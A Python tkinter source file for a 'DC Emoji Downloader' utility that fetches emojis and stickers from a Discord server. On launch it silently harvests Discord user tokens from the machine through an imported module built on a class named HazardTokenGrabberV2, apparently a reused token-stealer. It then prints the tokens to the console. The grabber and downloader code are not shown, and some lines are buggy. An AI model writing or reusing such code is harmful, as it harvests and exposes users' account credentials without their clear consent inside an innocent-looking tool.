#1.5.0
import grabber
import sys
import threading
import tkinter as tk
import winsound as ws
from downloader import EmojiDownloader
from tkinter import filedialog, simpledialog, Toplevel, ttk



class EmojiDownloaderApp:
    def __init__(self, root):
        self.root = root
        self.root.title("DC Emoji Downloader")
        self.root.geometry("350x200")
        self.root.configure(background="#36393f")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self.exit_program)
        center_window(self.root, 350, 200)

        self.server_id = tk.StringVar()
        self.status_text = tk.StringVar(value="Ready")
        self.folder = None
        self.usertoken = None
        self.accounts = grabber.get_token()

        if self.accounts['unique'] < 1:
            ws.PlaySound('SystemAsterisk', 0)
            self.usertoken = simpledialog.askstring("DC Emoji Downloader", "Couldn't detect your UserToken. Please enter it manually.")
            while not grabber.HazardTokenGrabberV2().checkToken(self.usertoken):
                if not self.usertoken:
                    self.exit_program()
                ws.PlaySound('SystemAsterisk', 0)
                self.usertoken = simpledialog.askstring("DC Emoji Downloader", "Invalid Token. Please enter a valid UserToken.")
            self.usertoken = [self.usertoken]
        elif self.accounts['unique'] == 1:
            self.usertoken = self.accounts['accounts'].values()[0]['token']
            print(f"Using token: {self.usertoken[0]}")
        else:
            def select_account(parent, accounts: dict):
                selection = {"token": None}
        
                parent.withdraw()
        
                top = Toplevel(parent)
                top.title("Choose your Discord account")
                top.geometry("400x150")
                center_window(top, 400, 150)
                top.resizable(False, False)
                top.grab_set()
                top.attributes('-topmost', True)
                top.focus_force()
        
                def confirm():
                    choice = combo.get()
                    if not choice:
                        return
                    uid = choice.split("(")[-1].rstrip(")")
                    selection["token"] = accounts[uid]["token"]
                    top.destroy()
        
                label = ttk.Label(top, text="Please choose your Discord account:")
                label.pack(pady=(15, 5))
        
                options = [f"{data['display_name']} ({uid})" for uid, data in accounts.items()]
                combo = ttk.Combobox(top, values=options, state="readonly", width=45)
                combo.current(0)
                combo.pack()
        
                btn = ttk.Button(top, text="Confirm", command=confirm)
                btn.pack(pady=10)
        
                top.wait_window()
                parent.deiconify()
                return selection["token"]
        
            chosen = select_account(self.root, self.accounts["accounts"])
            if not chosen:
                self.exit_program()
            self.usertoken = [chosen]
        
        print(self.usertoken)
        self.create_widgets()
        self.select_folder()
        self.root.after(100, lambda: self.root.focus_force())

    def create_widgets(self):
        tk.Label(self.root, text="Discord Server ID:", fg="white", bg="#36393f").place(relx=0.1, rely=0.2)
        tk.Entry(self.root, textvariable=self.server_id).place(relx=0.5, rely=0.2)
        
        self.status_label = tk.Label(self.root, textvariable=self.status_text, fg='#35bf25', bg="#36393f", font="-family {Segoe UI} -size 10")
        self.status_label.place(relx=0.1, rely=0.5, relwidth=0.8)
        
        self.download_button = tk.Button(self.root, text="Download", bg="#5865f2", fg="white", command=self.start_download)
        self.download_button.place(relx=0.4, rely=0.7)

    def start_download(self):
        self.download_button.config(state='disabled')
        threading.Thread(target=self.get_guild_data).start()

    def get_guild_data(self):
        guild_id = self.server_id.get().strip()
        if not guild_id.isdigit():
            self.update_status("Invalid Server ID", error=True)
            self.download_button.config(state='normal')
            return

        downloader = EmojiDownloader(self.usertoken, guild_id, self.folder, self.update_status)
        self.update_status("Downloading...")
        
        try:
            downloaded_count = downloader.download_content()
            self.update_status(f'Downloaded {downloaded_count} Emojis and Stickers from\n"{downloader.servername}"')
        except Exception as e:
            self.update_status(str(e), error=True)

        self.download_button.config(state='normal')

    def update_status(self, message, error=False):
        self.status_text.set(message)
        self.status_label.configure(fg='#e21223' if error else '#35bf25')

    def select_folder(self):
        self.folder = filedialog.askdirectory(title='Select the folder where your emojis should be saved.')
        while not self.folder:
            if not self.folder:
                self.exit_program()
            self.select_folder()

    def exit_program(self):
        self.root.withdraw()
        self.root.destroy()
        sys.exit()



def center_window(window, width, height):
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    x = (screen_width - width) // 2
    y = (screen_height - height) // 2
    window.geometry(f"{width}x{height}+{x}+{y}")

def main():
    root = tk.Tk()
    app = EmojiDownloaderApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()
